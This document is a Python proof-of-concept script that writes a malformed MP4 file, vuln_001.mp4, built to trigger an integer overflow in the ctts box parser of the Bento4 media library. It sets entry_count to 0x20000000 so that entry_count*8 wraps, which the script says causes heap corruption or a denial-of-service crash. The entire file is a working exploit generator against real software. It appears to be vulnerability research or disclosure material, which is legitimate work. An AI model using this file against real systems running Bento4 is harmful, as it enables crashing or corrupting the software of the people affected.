#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN 001:
AP4_CttsAtom integer overflow in entry_count*8 leads to heap corruption.

Location: Ap4CttsAtom.cpp lines 77-97
Trigger: ctts box with entry_count >= 0x20000000 causes entry_count*8 to
         integer-overflow (wraps to 0 or small value), leading to a heap
         allocation far smaller than the code expects — heap corruption / bad_alloc DoS.
"""

import struct
import os
import sys

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT = os.path.join(POC_DIR, "vuln_001.mp4")


def box(box_type: str, data: bytes) -> bytes:
    """Build an ISO base media box: size(4) + type(4) + data."""
    return struct.pack(">I", len(data) + 8) + box_type.encode("ascii") + data


def fullbox(box_type: str, version: int, flags: int, data: bytes) -> bytes:
    """Build a full box with version(1) + flags(3) prefix."""
    vf = struct.pack(">B", version) + struct.pack(">I", flags & 0xFFFFFF)[1:]
    return box(box_type, vf + data)


# ── ctts (the vulnerable box) ────────────────────────────────────────────────
# entry_count = 0x20000000; no actual entries provided.
# entry_count * 8 = 0x100000000 which overflows UI32 to 0 on 32-bit arithmetic,
# causing the parser to allocate far less memory than it will later access.
ENTRY_COUNT = 0x20000000
ctts = fullbox("ctts", 0, 0, struct.pack(">I", ENTRY_COUNT))

# ── sample table (stbl) ──────────────────────────────────────────────────────
stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))          # 0 entries
stts = fullbox("stts", 0, 0, struct.pack(">I", 0))          # 0 entries
stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))          # 0 entries
stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))      # sample_size=0, count=0
stco = fullbox("stco", 0, 0, struct.pack(">I", 0))          # 0 entries
stbl = box("stbl", stsd + stts + stsc + stsz + stco + ctts)

# ── media information (minf) ─────────────────────────────────────────────────
smhd = fullbox("smhd", 0, 0, b"\x00\x00\x00\x00")          # balance=0, reserved=0

# url entry: self-contained (flags=1)
url_entry = box("url ", struct.pack(">B", 0) + b"\x00\x00\x01")
dref = fullbox("dref", 0, 0, struct.pack(">I", 1) + url_entry)
dinf = box("dinf", dref)

minf = box("minf", smhd + dinf + stbl)

# ── media (mdia) ─────────────────────────────────────────────────────────────
mdhd = fullbox(
    "mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 1000, 0) +   # ctime, mtime, timescale, duration
    struct.pack(">HH", 0x15C7, 0),           # language=und, pre_defined=0
)

hdlr = fullbox(
    "hdlr", 0, 0,
    struct.pack(">I", 0) +                   # pre_defined
    b"soun" +                                # handler_type
    b"\x00" * 12 +                           # reserved
    b"\x00",                                 # name (empty, null-terminated)
)

mdia = box("mdia", mdhd + hdlr + minf)

# ── track (trak) ─────────────────────────────────────────────────────────────
UNITY_MATRIX = (
    struct.pack(">i", 0x00010000) + struct.pack(">i", 0) + struct.pack(">i", 0) +
    struct.pack(">i", 0) + struct.pack(">i", 0x00010000) + struct.pack(">i", 0) +
    struct.pack(">i", 0) + struct.pack(">i", 0) + struct.pack(">i", 0x40000000)
)  # 36 bytes

tkhd = fullbox(
    "tkhd", 0, 3,                            # flags=3: track_enabled | track_in_movie
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +  # ctime, mtime, track_id, reserved, duration
    b"\x00" * 8 +                            # reserved
    struct.pack(">hhhH", 0, 0, 0x0100, 0) + # layer, alt_group, volume(1.0), reserved
    UNITY_MATRIX +
    struct.pack(">II", 0, 0),               # width, height
)

trak = box("trak", tkhd + mdia)

# ── movie (moov) ─────────────────────────────────────────────────────────────
mvhd = fullbox(
    "mvhd", 0, 0,
    struct.pack(">IIII", 0, 0, 1000, 0) +   # ctime, mtime, timescale, duration
    struct.pack(">I", 0x00010000) +          # rate = 1.0
    struct.pack(">H", 0x0100) +             # volume = 1.0
    b"\x00" * 10 +                          # reserved
    UNITY_MATRIX +
    b"\x00" * 24 +                          # pre_defined
    struct.pack(">I", 2),                   # next_track_id
)

moov = box("moov", mvhd + trak)

# ── file type (ftyp) ─────────────────────────────────────────────────────────
ftyp = box("ftyp", b"mp42" + struct.pack(">I", 0) + b"isom")

# ── assemble and write ────────────────────────────────────────────────────────
mp4_data = ftyp + moov

with open(OUTPUT, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT}")
print(f"[+] ctts entry_count = 0x{ENTRY_COUNT:08X} ({ENTRY_COUNT})")
print(f"[+] entry_count * 8  = 0x{(ENTRY_COUNT * 8) & 0xFFFFFFFF:08X} (overflows on 32-bit)")
